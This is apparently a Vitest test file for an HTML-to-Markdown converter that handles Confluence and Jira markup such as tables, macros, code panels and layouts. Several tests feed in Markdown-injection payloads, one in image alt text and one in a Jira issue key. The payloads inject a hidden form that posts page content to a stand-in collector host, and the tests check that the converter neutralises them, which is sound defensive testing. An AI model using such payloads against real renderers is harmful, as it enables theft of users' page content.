import { marked } from "marked";
import { describe, expect, it, vi } from "vitest";

import { buildTurndown, htmlToMarkdown, htmlToMarkdownWithLayout } from "../../src/lib/html-to-md";
import { readFixtureText } from "../fixtures/fixture-loader";

function normalizeWhitespace(markdown: string): string {
  return markdown.replace(/\r\n/g, "\n").trim();
}

const hostileImageAlt =
  "x](https://assets.example.test/leak.png) <form action='https://collector.example.test/ingest' " +
  "method='post'><button>Copy Markdown</button><textarea hidden name='content'>";

describe("htmlToMarkdown", () => {
  it("converts headings, paragraphs, lists, code blocks, bold and italic text", () => {
    const markdown = htmlToMarkdown(`
      <h1>Title</h1>
      <p>Intro <strong>bold</strong> and <em>italic</em>.</p>
      <ul><li>One</li><li>Two</li></ul>
      <ol><li>First</li><li>Second</li></ol>
      <pre><code>const answer = 42;</code></pre>
    `);

    expect(markdown).toContain("# Title");
    expect(markdown).toContain("Intro **bold** and *italic*.");
    expect(markdown).toContain("-   One");
    expect(markdown).toContain("-   Two");
    expect(markdown).toContain("1.  First");
    expect(markdown).toContain("2.  Second");
    expect(markdown).toContain("```");
    expect(markdown).toContain("const answer = 42;");
  });

  it("converts links to inline Markdown links", () => {
    expect(htmlToMarkdown('<p><a href="https://example.com/docs">Docs</a></p>')).toBe(
      "[Docs](https://example.com/docs)",
    );
  });

  it("converts images and prefers data-image-src over src", () => {
    const markdown = htmlToMarkdown(`
      <p>
        <img src="fallback.png" data-image-src="preferred.png" alt="Preview">
        <img src="plain.png" alt="Plain">
      </p>
    `);

    expect(markdown).toContain("![Preview](preferred.png)");
    expect(markdown).toContain("![Plain](plain.png)");
    expect(markdown).not.toContain("fallback.png");
  });

  it("converts syntax highlighter pre blocks to fenced code with language", () => {
    const markdown = htmlToMarkdown(`
      <pre data-syntaxhighlighter-params="brush:java;first-line:1"><code>class Demo {}</code></pre>
    `);

    expect(markdown).toContain("```java\nclass Demo {}\n```");
  });

  it("encodes hostile image alt text so rendered output stays passive", () => {
    const markdown = htmlToMarkdown(
      `<p><img src="https://wiki.example/a.png" alt="${hostileImageAlt}"></p>`,
    );
    const rendered = new DOMParser().parseFromString(
      marked.parse(markdown, { async: false }),
      "text/html",
    );

    expect(rendered.querySelectorAll("form, button, textarea")).toHaveLength(0);
    expect(rendered.querySelector("img")?.getAttribute("alt")).toBe(hostileImageAlt);
    expect(rendered.querySelector("img")?.getAttribute("src")).toBe("https://wiki.example/a.png");
  });

  it("encodes hostile gallery image alt text so rendered output stays passive", () => {
    const markdown = htmlToMarkdown(
      `<ac:structured-macro ac:name="gallery">` +
        `<img src="lorem.png" alt="${hostileImageAlt}">` +
        `</ac:structured-macro>`,
    );
    const rendered = new DOMParser().parseFromString(
      marked.parse(markdown, { async: false }),
      "text/html",
    );

    expect(rendered.querySelectorAll("form, button, textarea")).toHaveLength(0);
    expect(rendered.querySelector("img")?.getAttribute("alt")).toBe(hostileImageAlt);
    expect(rendered.querySelector("img")?.getAttribute("src")).toBe("lorem.png");
  });

  it("encodes link destinations containing spaces so authored links still resolve", () => {
    const markdown = htmlToMarkdown(
      `<p><a href="https://wiki.example/attach/lorem image.png">Spacey</a></p>`,
    );
    const rendered = new DOMParser().parseFromString(
      marked.parse(markdown, { async: false }),
      "text/html",
    );

    expect(rendered.querySelector("a")).not.toBeNull();
    expect(rendered.querySelector("a")?.getAttribute("href")).toBe(
      "https://wiki.example/attach/lorem%20image.png",
    );
    expect(rendered.querySelector("a")?.textContent).toBe("Spacey");
  });

  it("encodes hostile Jira issue keys used as link labels", () => {
    const markdown = htmlToMarkdown(
      `<span class="jira-issue" data-jira-key="LOR-1](https://assets.example.test/x) ` +
        `<form action='https://collector.example.test/i'><button>b</button>">` +
        `<a class="jira-issue-key" href="https://jira.example/browse/LOR-1">LOR-1</a></span>`,
    );
    const rendered = new DOMParser().parseFromString(
      marked.parse(markdown, { async: false }),
      "text/html",
    );

    expect(rendered.querySelectorAll("form, button")).toHaveLength(0);
    expect(rendered.querySelector("a")?.getAttribute("href")).toBe(
      "https://jira.example/browse/LOR-1",
    );
    expect(rendered.querySelector("a")?.textContent).toContain("LOR-1");
  });

  it("keeps authored wiki-looking text literal without discarding real HTML formatting", async () => {
    const html = await readFixtureText("export/jira-markup.html");
    const markdown = htmlToMarkdown(html);
    const rendered = new DOMParser().parseFromString(
      marked.parse(markdown, { async: false }),
      "text/html",
    );
    const paragraphs = rendered.querySelectorAll("p");

    expect(paragraphs[0]?.textContent).toBe(
      "Lorem [LOR-12|https://jira.example/browse/LOR-12] and {*}ipsum{*} remain literal rendered text.",
    );
    expect(paragraphs[1]?.textContent).toBe("{code:sql}SELECT lorem FROM ipsum;{code}");
    expect(rendered.querySelector("a")).toBeNull();
    expect(rendered.querySelector("pre")).toBeNull();
    expect(rendered.querySelectorAll("strong")).toHaveLength(1);
    expect(rendered.querySelector("strong")?.textContent).toBe("dolor");
  });

  it("keeps wiki-looking code macros literal in rendered HTML", () => {
    const markdown = htmlToMarkdown("<p>{code:sql}select 1;{code}</p>");
    const rendered = new DOMParser().parseFromString(
      marked.parse(markdown, { async: false }),
      "text/html",
    );

    expect(rendered.querySelector("p")?.textContent).toBe("{code:sql}select 1;{code}");
    expect(rendered.querySelector("pre")).toBeNull();
  });

  it("omits attachment controls without removing surrounding page content", () => {
    const markdown = htmlToMarkdown(`
      <p>Lorem before</p>
      <div class="conf-macro" data-macro-name="attachments">
        <table><tr><th>Lorem chrome</th></tr><tr><td>Ipsum chrome</td></tr></table>
        <p>Lorem attachment control</p>
      </div>
      <p>Lorem after</p>
    `);

    expect(markdown).toBe("Lorem before\n\nLorem after");
  });

  it("returns an empty string for empty input", () => {
    expect(htmlToMarkdown("")).toBe("");
  });

  it("strips Confluence noise before conversion", () => {
    const markdown = htmlToMarkdown(`
      <p>&nbsp;</p>
      <p class="enh-settings hidden">{"enableNumbering":true}</p>
      <p class="auto-cursor-target"></p>
      <div class="auto-cursor-target">   </div>
      <div class="toc-macro"><a href="#contents">Contents</a></div>
      <h2>Section <a class="confluence-anchor-link" href="#Section">#</a></h2>
      <p>Useful text</p>
    `);

    expect(markdown).toContain("## Section");
    expect(markdown).toContain("Useful text");
    expect(markdown).not.toContain("enableNumbering");
    expect(markdown).not.toContain("Contents");
    expect(markdown).not.toContain("#Section");
    expect(markdown).not.toContain("auto-cursor-target");
  });

  it.each([
    ["confluence-information-macro-information", "INFO"],
    ["confluence-information-macro-warning", "WARNING"],
    ["confluence-information-macro-note", "NOTE"],
    ["confluence-information-macro-tip", "TIP"],
  ])("converts %s callouts to %s blockquotes", (macroClass, label) => {
    const markdown = htmlToMarkdown(`
      <div class="confluence-information-macro ${macroClass}">
        <p>Line one.</p>
        <p>Line two.</p>
      </div>
    `);

    expect(markdown).toContain(`> **${label}**`);
    expect(markdown).toContain("> Line one.");
    expect(markdown).toContain("> Line two.");
  });

  it("converts expand containers to details by default", () => {
    const markdown = htmlToMarkdown(`
      <div class="expand-container">
        <div class="expand-control">More & special</div>
        <div class="expand-content"><p>Hidden <strong>body</strong>.</p></div>
      </div>
    `);

    expect(markdown).toContain("<details>");
    expect(markdown).toContain("<summary>More &amp; special</summary>");
    expect(markdown).toContain("Hidden **body**.");
    expect(markdown).toContain("</details>");
  });

  it("converts expand containers to heading sections when details are disabled", () => {
    const markdown = htmlToMarkdown(
      `
        <div class="expand-container">
          <div class="expand-control">Fallback title</div>
          <div class="expand-content"><p>Fallback body.</p></div>
        </div>
      `,
      { spoilersAsDetails: false },
    );

    expect(markdown).toContain("### Fallback title");
    expect(markdown).toContain("Fallback body.");
    expect(markdown).not.toContain("<details>");
  });

  it("uses a custom image replacer for each image", () => {
    const seenSources: string[] = [];
    const imageReplacer = vi.fn((img: HTMLImageElement): string => {
      seenSources.push(img.getAttribute("data-image-src") || img.getAttribute("src") || "");
      return `![custom:${img.alt}](images/${img.alt}.png)`;
    });

    const markdown = htmlToMarkdown(
      `
        <img src="first.png" alt="first">
        <img src="fallback.png" data-image-src="second.png" alt="second">
      `,
      { imageReplacer },
    );

    expect(imageReplacer).toHaveBeenCalledTimes(2);
    expect(seenSources).toEqual(["first.png", "second.png"]);
    expect(markdown).toContain("![custom:first](images/first.png)");
    expect(markdown).toContain("![custom:second](images/second.png)");
  });

  it("uses a custom link rewriter for link hrefs", () => {
    const linkRewriter = vi.fn(
      (href: string, text: string): string => `/rewritten/${text}/${href}`,
    );

    const markdown = htmlToMarkdown('<p><a href="page.html">Page</a></p>', { linkRewriter });

    expect(markdown).toBe("[Page](/rewritten/Page/page.html)");
    expect(linkRewriter).toHaveBeenCalledWith("page.html", "Page");
  });

  it("renders matching ordinary and table links before applying the fallback rewriter", () => {
    const linkRenderer = vi.fn((href: string, text: string): string | undefined =>
      href === "diagram" ? `![${text}](attachments/linked/plantuml/diagram.png)` : undefined,
    );
    const linkRewriter = vi.fn((href: string): string => `/rewritten/${href}`);

    const markdown = htmlToMarkdown(
      `
        <p><a href="diagram">Architecture</a> <a href="page">Page</a></p>
        <table>
          <tr><th>Type</th><th>Asset</th></tr>
          <tr><td>Diagram</td><td><a href="diagram">Sequence</a></td></tr>
        </table>
      `,
      { linkRenderer, linkRewriter },
    );

    expect(markdown).toContain(
      "![Architecture](attachments/linked/plantuml/diagram.png) [Page](/rewritten/page)",
    );
    expect(markdown).toContain(
      "| Diagram | ![Sequence](attachments/linked/plantuml/diagram.png) |",
    );
    expect(linkRewriter).toHaveBeenCalledWith("page", "Page");
    expect(linkRewriter).not.toHaveBeenCalledWith("diagram", expect.any(String));
  });

  it("converts tables with thead to GFM tables", () => {
    const markdown = htmlToMarkdown(`
      <table>
        <thead><tr><th>Lorem key</th><th>Lorem type</th></tr></thead>
        <tbody><tr><td>ipsum</td><td>LoremItem[]</td></tr></tbody>
      </table>
    `);

    expect(markdown).toContain("| Lorem key | Lorem type |");
    expect(markdown).toContain("| --- | --- |");
    expect(markdown).toContain("| ipsum | LoremItem\\[\\] |");
  });

  it("uses the first th row as the GFM table header", () => {
    const markdown = htmlToMarkdown(`
      <table>
        <tr><th>Property</th><th>Description</th></tr>
        <tr><td>mode</td><td>Display mode</td></tr>
      </table>
    `);

    expect(markdown).toContain("| Property | Description |");
    expect(markdown).toContain("| mode | Display mode |");
  });

  it("uses the first row as a header when tables have no th cells", () => {
    const markdown = htmlToMarkdown(`
      <table>
        <tr><td>Column A</td><td>Column B</td></tr>
        <tr><td>A1</td><td>B1</td></tr>
      </table>
    `);

    expect(markdown).toContain("| Column A | Column B |");
    expect(markdown).toContain("| A1 | B1 |");
  });

  it("keeps key-value table entries as body rows beneath a generated header", () => {
    const markdown = htmlToMarkdown(`
      <table>
        <tr><th>Lorem key</th><td>ipsum</td></tr>
        <tr><th>Lorem value</th><td>dolor</td></tr>
      </table>
    `);
    const rendered = new DOMParser().parseFromString(
      marked.parse(markdown, { async: false }),
      "text/html",
    );
    const rows = Array.from(rendered.querySelectorAll("tbody tr"), (row) =>
      Array.from(row.querySelectorAll("td"), (cell) => cell.textContent),
    );

    expect(rendered.querySelectorAll("thead th")).toHaveLength(2);
    expect(rows).toEqual([
      ["Lorem key", "ipsum"],
      ["Lorem value", "dolor"],
    ]);
  });

  it("duplicates cells for colspan and rowspan", () => {
    const markdown = htmlToMarkdown(`
      <table>
        <tr><th colspan="2">Combined</th><th>Third</th></tr>
        <tr><td rowspan="2">A</td><td>B1</td><td>C1</td></tr>
        <tr><td>B2</td><td>C2</td></tr>
      </table>
    `);

    expect(markdown).toContain("| Combined | Combined | Third |");
    expect(markdown).toContain("| A | B1 | C1 |");
    expect(markdown).toContain("| A | B2 | C2 |");
  });

  it("strips tablesorter markup from table cells", () => {
    const markdown = htmlToMarkdown(`
      <table>
        <tr>
          <th><div class="tablesorter-header-inner">Title<span class="tablesorter-headerIcon">sort</span></div></th>
          <th><span class="tablesorter-header-indicator">sort</span>Value</th>
        </tr>
        <tr><td>Text</td><td><span class="aui-icon">icon</span>42</td></tr>
      </table>
    `);

    expect(markdown).toContain("| Title | Value |");
    expect(markdown).toContain("| Text | 42 |");
    expect(markdown).not.toContain("sort");
    expect(markdown).not.toContain("icon");
  });

  it("removes elements matching dropSelectors", () => {
    const markdown = htmlToMarkdown(
      '<article><p>Keep</p><aside class="internal">Drop</aside><p data-private="true">Secret</p></article>',
      { dropSelectors: [".internal", "[data-private='true']"] },
    );

    expect(markdown).toContain("Keep");
    expect(markdown).not.toContain("Drop");
    expect(markdown).not.toContain("Secret");
  });
});

describe("buildTurndown", () => {
  it("creates a Turndown service with custom rules and options", () => {
    const service = buildTurndown({
      imageReplacer: (img: HTMLImageElement): string => `![asset](${img.getAttribute("src")})`,
      linkRewriter: (href: string): string => `https://wiki.example.com${href}`,
      spoilersAsDetails: false,
      dropSelectors: [".drop-me"],
    });

    const markdown = service.turndown(`
      <p class="drop-me">Drop</p>
      <a href="/page">Page</a>
      <img src="asset.png" alt="Asset">
      <div class="expand-container">
        <div class="expand-control">Details title</div>
        <div class="expand-content"><p>Details body</p></div>
      </div>
    `);

    expect(markdown).not.toContain("Drop");
    expect(markdown).toContain("[Page](https://wiki.example.com/page)");
    expect(markdown).toContain("![asset](asset.png)");
    expect(markdown).toContain("### Details title");
  });
});

describe("jira issue macro", () => {
  it("converts an unresolved issue to a link with summary and status", () => {
    const md = htmlToMarkdown(`
      <span class="jira-issue" data-jira-key="LOR-12">
        <a href="https://jira.example/browse/LOR-12" class="jira-issue-key">LOR-12</a>
        <span class="summary">Lorem issue</span>
        <span class="aui-lozenge">LOREM READY</span>
      </span>
    `);
    expect(md).toContain("[LOR-12](https://jira.example/browse/LOR-12)");
    expect(md).toContain("- Lorem issue");
    expect(md).toContain("[LOREM READY]");
    expect(md).not.toContain("~~");
  });

  it("marks the whole resolved issue reference with strikethrough", () => {
    const md = htmlToMarkdown(`
      <span class="jira-issue resolved" data-jira-key="LOR-13">
        <a href="https://jira.example/browse/LOR-13" class="jira-issue-key">LOR-13</a>
        <span class="summary">Ipsum issue</span>
        <span class="aui-lozenge">LOREM COMPLETE</span>
      </span>
    `);
    expect(md).toContain(
      "~~[LOR-13](https://jira.example/browse/LOR-13) - Ipsum issue [LOREM COMPLETE]~~",
    );
  });

  it("keeps an issue link without inventing an absent summary or status", () => {
    const md = htmlToMarkdown(`
      <span class="jira-issue" data-jira-key="LOR-12">
        <a href="https://jira.example/browse/LOR-12" class="jira-issue-key">LOR-12</a>
      </span>
    `);
    expect(md).toBe("[LOR-12](https://jira.example/browse/LOR-12)");
  });
});

describe("aui lozenge badge", () => {
  it("converts standalone lozenge to bracketed text", () => {
    const md = htmlToMarkdown('<span class="aui-lozenge">LOREM READY</span>');
    expect(md).toContain("[LOREM READY]");
  });

  it("does not double-render lozenge inside jira-issue", () => {
    const md = htmlToMarkdown(`
      <span class="jira-issue" data-jira-key="LOR-12">
        <a href="https://jira.example/browse/LOR-12" class="jira-issue-key">LOR-12</a>
        <span class="aui-lozenge">LOREM READY</span>
      </span>
    `);
    const lozengeCount = (md.match(/\[LOREM READY\]/g) || []).length;
    expect(lozengeCount).toBe(1);
  });
});

describe("confluence code block", () => {
  it("extracts code with language from code panel", () => {
    const md = htmlToMarkdown(`
      <div class="code panel pdl">
        <div class="codeContent panelContent pdl">
          <pre><code class="java">public class Main { }</code></pre>
        </div>
      </div>
    `);
    expect(md).toContain("```java");
    expect(md).toContain("public class Main { }");
    expect(md).toContain("```");
  });

  it("extracts language from syntaxhighlighter params", () => {
    const md = htmlToMarkdown(`
      <div class="code panel pdl">
        <div class="codeContent panelContent pdl">
          <pre class="syntaxhighlighter-pre" data-syntaxhighlighter-params="brush: python; gutter: false">
            <code>print("hello")</code>
          </pre>
        </div>
      </div>
    `);
    expect(md).toContain("```python");
    expect(md).toContain('print("hello")');
  });

  it("handles code block without language", () => {
    const md = htmlToMarkdown(`
      <div class="code panel">
        <div class="codeContent panelContent">
          <pre><code>some plain code</code></pre>
        </div>
      </div>
    `);
    expect(md).toContain("```");
    expect(md).toContain("some plain code");
  });
});

describe("fabric code block (Confluence Cloud)", () => {
  it("extracts code with language from data-code-lang attribute", () => {
    const md = htmlToMarkdown(`
      <span data-code-lang="json" data-ds--code--code-block="" data-testid="renderer-code-block">
        <code class="language-json" style="white-space:pre">
          <span data-testid="renderer-code-block-line-1" data-ds--code--row="">
            <span class="comment linenumber ds-line-number" data-ds--line-number="1"></span>
            <span class=""><span class="token punctuation">{</span><span class="">
</span></span></span>
          <span data-testid="renderer-code-block-line-2" data-ds--code--row="">
            <span class="comment linenumber ds-line-number" data-ds--line-number="2"></span>
            <span class=""><span class="">  </span><span class="token property">"some"</span><span class="token operator">:</span><span class=""> </span><span class="token string">"value"</span><span class="">
</span></span></span>
          <span data-testid="renderer-code-block-line-3" data-ds--code--row="">
            <span class="comment linenumber ds-line-number" data-ds--line-number="3"></span>
            <span class=""><span class="token punctuation">}</span></span></span>
        </code>
      </span>
    `);
    expect(md).toContain("```json");
    expect(md).toContain('"some"');
    expect(md).toContain('"value"');
    expect(md).toContain("```");
  });

  it("extracts language from code class when data-code-lang is absent", () => {
    const md = htmlToMarkdown(`
      <span data-ds--code--code-block="" data-testid="renderer-code-block">
        <code class="language-python" style="white-space:pre">
          <span data-ds--code--row=""><span>print("hello")</span></span>
        </code>
      </span>
    `);
    expect(md).toContain("```python");
    expect(md).toContain('print("hello")');
  });

  it("extracts language from code data-code-lang", () => {
    const md = htmlToMarkdown(`
      <span data-ds--code--code-block="" data-testid="renderer-code-block">
        <code data-code-lang="sql" style="white-space:pre">
          <span data-ds--code--row=""><span>select * from users;</span></span>
        </code>
      </span>
    `);
    expect(md).toContain("```sql");
    expect(md).toContain("select * from users;");
  });

  it("handles fabric code block without language", () => {
    const md = htmlToMarkdown(`
      <span data-ds--code--code-block="" data-testid="renderer-code-block">
        <code style="white-space:pre">
          <span data-ds--code--row=""><span>plain text code</span></span>
        </code>
      </span>
    `);
    expect(md).toContain("```");
    expect(md).toContain("plain text code");
  });

  it("returns empty when fabric code block has no code element", () => {
    const md = htmlToMarkdown(`
      <span data-ds--code--code-block="" data-testid="renderer-code-block">
      </span>
    `);
    expect(md.trim()).toBe("");
  });
});

describe("confluence task list", () => {
  it("converts checked and unchecked tasks to GFM task list", () => {
    const md = htmlToMarkdown(`
      <div class="task-list">
        <div class="task-list-item" data-status="checked">
          <input type="checkbox" checked="checked" disabled="disabled">
          <span class="task-list-body">Done item</span>
        </div>
        <div class="task-list-item" data-status="unchecked">
          <input type="checkbox" disabled="disabled">
          <span class="task-list-body">Pending item</span>
        </div>
      </div>
    `);
    expect(md).toContain("- [x] Done item");
    expect(md).toContain("- [ ] Pending item");
  });

  it("handles empty task list", () => {
    const md = htmlToMarkdown('<div class="task-list"></div>');
    expect(md).not.toContain("[x]");
    expect(md).not.toContain("[ ]");
  });
});

describe("confluence user mention", () => {
  it("converts an authored user link to a Markdown mention", () => {
    const md = htmlToMarkdown(
      '<a class="confluence-userlink" data-username="lorem" href="/display/~lorem">Lorem ipsum</a>',
    );
    expect(md).toContain("@lorem");
  });

  it("converts an authored span mention without a profile link", () => {
    const md = htmlToMarkdown(
      '<span class="confluence-userlink" data-username="ipsum">@ipsum</span>',
    );
    expect(md).toContain("@ipsum");
  });
});

describe("Confluence page layouts", () => {
  const view = `
    <div class="contentLayout2">
      <div class="columnLayout two-equal" data-layout="two-equal">
        <div class="cell"><div class="innerCell"><h2>Left</h2><p>Alpha</p></div></div>
        <div class="cell"><div class="innerCell"><p><a href="diagram">Diagram</a></p></div></div>
      </div>
      <div class="columnLayout single" data-layout="single">
        <div class="cell"><div class="innerCell"><h2>Bottom</h2></div></div>
      </div>
    </div>
  `;
  const storage = `
    <ac:layout>
      <ac:layout-section ac:type="two_equal">
        <ac:layout-cell><h2>Left</h2><p>Alpha</p></ac:layout-cell>
        <ac:layout-cell><p>Diagram</p></ac:layout-cell>
      </ac:layout-section>
      <ac:layout-section ac:type="single">
        <ac:layout-cell><h2>Bottom</h2></ac:layout-cell>
      </ac:layout-section>
    </ac:layout>
  `;

  it("preserves sections and applies ordinary link rendering inside cells", () => {
    const result = htmlToMarkdownWithLayout(view, {
      storageHtml: storage,
      linkRenderer: (href, text) => (href === "diagram" ? `![${text}](diagram.png)` : undefined),
    });

    expect(result.layout).toEqual({ status: "preserved", sections: 2 });
    expect(result.markdown).toContain('<!-- confx:section:start type="two_equal" -->');
    expect(result.markdown).toContain("## Left");
    expect(result.markdown).toContain("![Diagram](diagram.png)");
  });

  it("flattens content and reports a mismatch without reversible markers", () => {
    const result = htmlToMarkdownWithLayout(view, {
      storageHtml: storage.replace('ac:type="two_equal"', 'ac:type="single"'),
    });

    expect(result.layout).toEqual({ status: "flattened", sections: 2 });
    expect(result.markdown).toContain("## Left");
    expect(result.markdown).not.toContain("confx:layout:start");
  });

  it("keeps ordinary pages unchanged", () => {
    const result = htmlToMarkdownWithLayout("<h2>Plain</h2>", {
      storageHtml: "<h2>Plain</h2>",
    });

    expect(result).toEqual({
      markdown: "## Plain",
      layout: { status: "none", sections: 0 },
    });
  });
});

describe("htmlToMarkdown integration", () => {
  it("preserves authored tables, macros, code and resources while excluding page chrome", async () => {
    const html = await readFixtureText("confluence-page.html");
    const markdown = normalizeWhitespace(
      htmlToMarkdown(html, { dropSelectors: ["#breadcrumb-section", ".page-metadata"] }),
    );
    const rendered = new DOMParser().parseFromString(
      marked.parse(markdown, { async: false }),
      "text/html",
    );

    expect(rendered.querySelectorAll("h1")).toHaveLength(1);
    expect(rendered.querySelector("blockquote strong")?.textContent).toBe("NOTE");
    expect(rendered.querySelector("details summary")?.textContent).toBe("Lorem expansion");
    expect(markdown).toContain("Lorem expanded *details*.");
    expect(rendered.querySelectorAll("table thead th")).toHaveLength(2);
    expect(rendered.querySelectorAll("table tbody tr")).toHaveLength(2);
    expect(rendered.querySelector("pre code.language-js")?.textContent).toBe(
      'const lorem = "<Lorem>";\n  lorem.trim();\n',
    );
    expect(rendered.querySelector("img")?.getAttribute("src")).toBe(
      "/download/attachments/1700/lorem.png",
    );
    expect(markdown).not.toContain("Lorem chrome");
    expect(markdown).not.toContain("Lorem attachment chrome");
    expect(markdown).not.toContain("Lorem attachment control");
    expect(markdown).not.toContain("Lorem contents");
    expect(markdown).not.toContain('{"lorem":true}');
    expect(markdown).not.toContain("¶");
  });
});
